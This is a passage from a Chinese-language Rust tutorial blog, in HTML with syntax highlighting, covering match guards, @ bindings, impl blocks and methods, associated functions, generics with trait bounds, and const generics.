class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Got 50"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">if</span> n <span class="token operator">==</span> y <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Matched, n = {}"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>        _ <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Default case, x = {:?}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"at the end: x = {:?}, y = {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>匹配守卫的条件会作用于所有的模式</strong></p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">match</span> x <span class="token punctuation">{</span>    <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">5</span> <span class="token operator">|</span> <span class="token number">6</span> <span class="token keyword">if</span> y <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _ <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个例子中看起来好像 <code>if y</code> 只作用于 <code>6</code>，但实际上匹配守卫 <code>if y</code> 作用于 <code>4</code>、<code>5</code> <strong>和</strong> <code>6</code> ，在满足 <code>x</code> 属于 <code>4 | 5 | 6</code> 后才会判断 <code>y</code> 是否为 <code>true</code>：</p></blockquote><h3 id="绑定"><a href="#绑定" class="headerlink" title="@绑定"></a>@绑定</h3><blockquote><p>说白了就是我们即想要模式匹配，匹配成功后又想通过解构的形式拿到对应的值</p><p>小孩子才做选择 大人全都要！</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">enum</span> <span class="token type-definition class-name">Message</span> <span class="token punctuation">{</span>    <span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">let</span> msg <span class="token operator">=</span> <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">match</span> msg <span class="token punctuation">{</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> id_variable <span class="token operator">@</span> <span class="token number">3</span><span class="token punctuation">..=</span><span class="token number">7</span> <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found an id in range: {}"</span><span class="token punctuation">,</span> id_variable<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">..=</span><span class="token number">12</span> <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found an id in another range"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found some other id: {}"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个例子的第一个分支中，我们既通过解构拿到了id，又对他进行了模式匹配: 在3..=7范围内才能通过。</p><p>注意:</p><blockquote><p>考虑下面一段代码:</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> <span class="token number">1</span> <span class="token punctuation">{</span>        num <span class="token operator">@</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _ <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译不通过，是因为 <code>num</code> 没有绑定到所有的模式上，只绑定了模式 <code>1</code>，你可能会试图通过这个方式来解决：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">num <span class="token operator">@</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。</p></blockquote><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>Rust使用<code>impl</code>块来定义方法，多说无益，先来一段示例代码</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token comment">// new是Circle的关联函数，因为它的第一个参数不是self</span>    <span class="token comment">// 这种方法往往用于初始化当前结构体的实例</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与java的不同在于，要实现一个类似于java类的结构，我们需要定义struct和它的impl，相当于字段的声明和方法的声明被分开了。</p><p>并且，impl可以有很多个</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样做的好处在于可以让方法的声明更加清晰，我们可以把为完成同一种职能的方法声明在一个impl块中，这样比起塞在一块会有条理得多。</p><h3 id="关联函数-amp-方法"><a href="#关联函数-amp-方法" class="headerlink" title="关联函数&amp;方法"></a>关联函数&amp;方法</h3><p>看到<code>函数</code>和<code>方法</code>二字我们便可以知晓他们的不同。函数不会绑定在一个对象上，而方法会。</p><p>我们先来看一下如何声明关联函数与方法</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token comment">// new是Circle的关联函数，因为它的第一个参数不是self</span>    <span class="token comment">// 这种方法往往用于初始化当前结构体的实例</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，所谓的方法，就是传入了一个<code>&amp;self</code>的函数，这是一个语法糖，实际上是 <code>self: &amp;Self</code> 的简写。意思是我们传入了一个这个类型的实例的引用。这样在调用时便可以直接<code>circle.area()</code>。</p><p>而没有传入自身引用的关联函数又是什么呢？我只说四个字——<strong>静态方法</strong>。</p><h3 id="为枚举实现方法"><a href="#为枚举实现方法" class="headerlink" title="为枚举实现方法"></a>为枚举实现方法</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#![allow(unused)]</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Message</span> <span class="token punctuation">{</span>    <span class="token class-name">Quit</span><span class="token punctuation">,</span>    <span class="token class-name">Move</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">ChangeColor</span><span class="token punctuation">(</span><span class="token keyword">i32</span><span class="token punctuation">,</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Message</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">call</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 在这里定义方法体</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛型-amp-特征-trait"><a href="#泛型-amp-特征-trait" class="headerlink" title="泛型&amp;特征(trait)"></a>泛型&amp;特征(trait)</h2><h3 id="声明一个基础的泛型"><a href="#声明一个基础的泛型" class="headerlink" title="声明一个基础的泛型"></a>声明一个基础的泛型</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">add</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">T</span> <span class="token punctuation">{</span>    a <span class="token operator">+</span> b<span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add i8: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2i8</span><span class="token punctuation">,</span> <span class="token number">3i8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add i32: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add f64: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1.23</span><span class="token punctuation">,</span> <span class="token number">1.23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然可以看出来，这串代码是跑不了的，不是所有类型都允许相加的</p><h3 id="使用trait约束泛型的类型"><a href="#使用trait约束泛型的类型" class="headerlink" title="使用trait约束泛型的类型"></a>使用trait约束泛型的类型</h3><p>那我们就尝试对他的类型进行约束</p><p>这里语法比较类似kotlin</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">add</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>ops<span class="token punctuation">::</span></span><span class="token class-name">Add</span><span class="token operator">&lt;</span><span class="token class-name">Output</span> <span class="token operator">=</span> <span class="token class-name">T</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">T</span> <span class="token punctuation">{</span>    a <span class="token operator">+</span> b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的<code>std::ops::Add&lt;Output = T&gt;</code>是不是比较类似于kotlin的接口？在rust中它叫做<code>trait </code>,特征。而实现了<code>std::ops::Add&lt;Output = T&gt;</code>,就支持了相加，泛型output就是相加后结果的类型。</p><blockquote><p>这些都说明一个道理，特征定义了<strong>一个可以被共享的行为，只要实现了特征，你就能使用该行为</strong>。</p></blockquote><h3 id="在枚举中使用泛型"><a href="#在枚举中使用泛型" class="headerlink" title="在枚举中使用泛型"></a>在枚举中使用泛型</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">enum</span> <span class="token type-definition class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">None</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在方法中使用泛型"><a href="#在方法中使用泛型" class="headerlink" title="在方法中使用泛型"></a>在方法中使用泛型</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Point</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token class-name">Point</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token operator">&amp;</span><span class="token class-name">T</span> <span class="token punctuation">{</span>        <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>x    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"p.x = {}"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个例子中，<code>T,U</code> 是定义在结构体 <code>Point</code> 上的泛型参数，<code>V,W</code> 是单独定义在方法 <code>mixup</code> 上的泛型参数，它们并不冲突，说白了，你可以理解为，一个是结构体泛型，一个是函数泛型。</p></blockquote><h3 id="为具体的泛型类型实现方法"><a href="#为具体的泛型类型实现方法" class="headerlink" title="为具体的泛型类型实现方法"></a>为具体的泛型类型实现方法</h3><blockquote><p>对于 <code>Point&lt;T&gt;</code> 类型，你不仅能定义基于 <code>T</code> 的方法，还能针对特定的具体类型，进行方法定义：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Point</span><span class="token operator">&lt;</span><span class="token keyword">f32</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">distance_from_origin</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f32</span> <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>y<span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码意味着 <code>Point&lt;f32&gt;</code> 类型会有一个方法 <code>distance_from_origin</code>，而其他 <code>T</code> 不是 <code>f32</code> 类型的 <code>Point&lt;T&gt; </code>实例则没有定义此方法。这个方法计算点实例与坐标<code>(0.0, 0.0)</code> 之间的距离，并使用了只能用于浮点型的数学运算符。</p><p>这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。</p></blockquote><h3 id="const-泛型"><a href="#const-泛型" class="headerlink" title="const 泛型"></a>const 泛型</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">display_array</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>fmt<span class="token punctuation">::</span></span><span class="token class-name">Debug</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>arr<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{:?}"</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先看看这段代码，如果我们想要约束传入切片的大小该怎么做呢</p><p>const泛型其实就是针对常量值的泛型</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">display_array</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>fmt<span class="token punctuation">::</span></span><span class="token class-name">Debug</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">N</span><span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">;</span> <span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{:?}"</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token 